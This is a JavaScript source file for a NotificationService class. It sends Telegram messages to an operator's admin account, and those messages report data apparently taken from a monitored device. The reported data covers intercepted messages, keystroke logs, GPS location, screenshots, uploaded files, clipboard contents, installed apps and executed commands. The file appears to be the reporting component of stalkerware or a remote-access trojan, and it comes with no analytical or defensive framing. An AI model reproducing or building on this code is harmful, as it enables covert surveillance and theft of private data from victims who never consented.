const Logger = require('../utils/Logger');

class NotificationService {
    constructor() {
        this.logger = new Logger();
        this.bot = null;
        this.adminId = parseInt(process.env.TELEGRAM_ADMIN_ID);
    }
    
    setBotInstance(bot) {
        this.bot = bot;
    }
    
    async sendNotification(message, options = {}) {
        if (!this.bot || !this.adminId) return;
        
        try {
            await this.bot.sendMessage(this.adminId, message, {
                parse_mode: 'Markdown',
                ...options
            });
        } catch (error) {
            this.logger.error('Failed to send notification:', error);
        }
    }
    
    async forwardNotification(app, title, text) {
        const message = `
🔔 *New Notification*

📱 *App:* ${app}
📌 *Title:* ${title}
💬 *Message:* ${text}
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async forwardMessage(sender, recipient, content) {
        const message = `
💬 *New Message Captured*

👤 *From:* ${sender}
👥 *To:* ${recipient}
📝 *Content:* ${content}
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifyKeylogs(keylogs) {
        if (!keylogs || keylogs.length === 0) return;
        
        let message = '⌨️ *Keystrokes Captured*\n\n';
        
        for (const log of keylogs.slice(-10)) { // Last 10 entries
            message += `[${log.window || 'Unknown'}]: ${log.keys}\n`;
        }
        
        message += `\n_Total: ${keylogs.length} keystrokes_`;
        
        await this.sendNotification(message);
    }
    
    async notifyLocation(latitude, longitude) {
        if (!this.bot || !this.adminId) return;
        
        try {
            await this.bot.sendLocation(this.adminId, latitude, longitude);
            await this.sendNotification(`📍 *Location Update*\nNew location tracked at ${new Date().toLocaleString()}`);
        } catch (error) {
            this.logger.error('Failed to send location notification:', error);
        }
    }
    
    async notifyScreenshot(filename) {
        const message = `
📸 *Screenshot Captured*

📁 *File:* ${filename}
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifyFileUpload(filename, size) {
        const message = `
📤 *File Uploaded*

📁 *Name:* ${filename}
💾 *Size:* ${this.formatBytes(size)}
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifySystemAlert(title, description, severity = 'info') {
        const severityEmoji = {
            'info': 'ℹ️',
            'warning': '⚠️',
            'error': '❌',
            'critical': '🚨'
        };
        
        const message = `
${severityEmoji[severity]} *System Alert*

*${title}*

${description}

🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifyCommandExecution(command, status) {
        const statusEmoji = status === 'success' ? '✅' : '❌';
        
        const message = `
⚡ *Command Executed*

${statusEmoji} *Status:* ${status}
💻 *Command:* \`${command}\`
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifyAppInstalled(appName, packageName) {
        const message = `
📱 *New App Installed*

*Name:* ${appName}
*Package:* ${packageName}
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifyWiFiConnection(ssid, signalStrength) {
        const message = `
📶 *WiFi Connected*

*Network:* ${ssid}
*Signal:* ${signalStrength}%
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifyBatteryStatus(level, isCharging) {
        const chargingEmoji = isCharging ? '🔌' : '🔋';
        
        const message = `
${chargingEmoji} *Battery Status*

*Level:* ${level}%
*Charging:* ${isCharging ? 'Yes' : 'No'}
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    async notifyClipboardChange(content) {
        const truncatedContent = content.length > 200 
            ? content.substring(0, 200) + '...' 
            : content;
        
        const message = `
📋 *Clipboard Changed*

*Content:* \`${truncatedContent}\`
🕐 *Time:* ${new Date().toLocaleString()}
        `;
        
        await this.sendNotification(message);
    }
    
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
    }
}

module.exports = NotificationService;